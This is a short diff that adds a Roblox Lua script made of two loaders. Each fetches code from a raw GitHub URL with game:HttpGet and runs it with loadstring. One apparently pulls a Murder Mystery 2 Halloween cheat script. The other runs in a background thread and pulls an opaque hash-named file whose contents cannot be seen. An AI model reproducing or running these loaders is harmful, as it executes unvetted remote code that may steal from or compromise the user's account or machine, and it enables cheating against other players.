@@ -1,0 +1,5 @@
+spawn(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/c79fbcae4d2ce096dbe9547d.lua'))()
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua"))()
